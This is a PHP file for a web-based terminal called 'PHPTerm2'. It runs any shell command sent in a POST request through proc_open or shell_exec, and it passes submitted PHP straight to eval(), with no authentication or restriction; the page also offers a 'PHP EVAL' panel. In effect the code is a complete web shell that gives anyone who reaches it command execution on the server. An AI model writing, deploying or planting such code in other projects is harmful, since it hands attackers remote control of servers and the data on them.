<?php 
@session_start();
function getLeft(){
	$cu = get_current_user();
	if (strlen($cu)>7) $cu = substr($cu,0,5).'..';
	$cw = '/'.getcwd();
	if ($cw[strlen($cw)-1]=='/' || $cw[strlen($cw)-1]=='\\') $cw = substr($cw,0,strlen($cw)-1);
	$cw = substr($cw,1+max(strrpos($cw,'/'),strrpos($cw,'\\')));
	if (strlen($cw)>14) $cu = substr($cu,0,12).'..';
	return $cu.'['.$cw.']>';
}
if (isset($_POST['cmd'])){
	header('Content-type: text/json');
	chdir($_POST['cwd']);
	$cmd = $_POST['cmd'];
	if (get_magic_quotes_gpc()) $cmd = stripslashes($cmd);
	$stdout = '';
	$superaddition = '';
	if (substr($cmd,0,3)=='cd ') {
		chdir(realpath(substr($cmd,3)));
	} elseif ($cmd=='_SPECIAL_RUNPHP') {
		ob_start();
		$stdout = eval($_POST['php'].';');
		$stdout .= "\n".ob_get_contents();
		ob_end_clean();
	} else 
		if(function_exists("proc_open")) {
			$p = proc_open(@$cmd,
				array(
				1 => array('pipe', 'w'),
				2 => array('pipe', 'w')), $io,getcwd());
			$_SESSION['proc'] = $p;
			
			/* Read output sent to stdout. */
			while (!feof($io[1])) {
				$stdout .= fgets($io[1]);
			}
			/* Read output sent to stderr. */
			while (!feof($io[2])) {
				$stdout .= fgets($io[2]);
			}
			
			fclose($io[1]);
			fclose($io[2]);
			proc_close($p);
		} else {
			$stdout=shell_exec($cmd);
		}
	echo(json_encode(array('cwd'=>getcwd(),'left'=>getLeft(),'output'=>$stdout,'superaddition'=>$superaddition)));
	exit;
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>PHPTerm2</title>
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div class="topbarSpace" id="topbar">
<jar>
CWD: <span id="cwd"><?php echo getcwd() ?></span><br>
<span id="remoteerr"></span>
<br><a href="javascript:phpevalshow()">Open PHP Eval</a> | <a href="javascript:history.go(0)">Refresh Page</a></jar>
</div>
<div class="topbarSpace"></div>
<div id="output"><pre>Hello World!</pre></div>
<div id="spacer"></div>
<div id="input">
<div id="inleft" onMouseOver="txtin.focus();" onKeyDown="txtin.focus();"></div><input id="in" onkeypress="if(event.keyCode==13){inright.click();return false;}" onKeyDown="return(keydown1(event))"><input id="inright" value="Enter" type="button" onClick="send()">
</div>
<div id="phpeval" align="center">
<div class="topb1">::PHP EVAL::<a href="javascript:phpevalhide()">×</a></div>
<div align="left">&lt;?php</div>
<textarea id="phpevalin" cols="" rows="">var_dump()</textarea>
<br>
<input value="Execute" type="button" onClick="phpevalrun();phpevalhide()">
</div>
<script type="text/javascript" src="js.js"></script>
</body>
</html>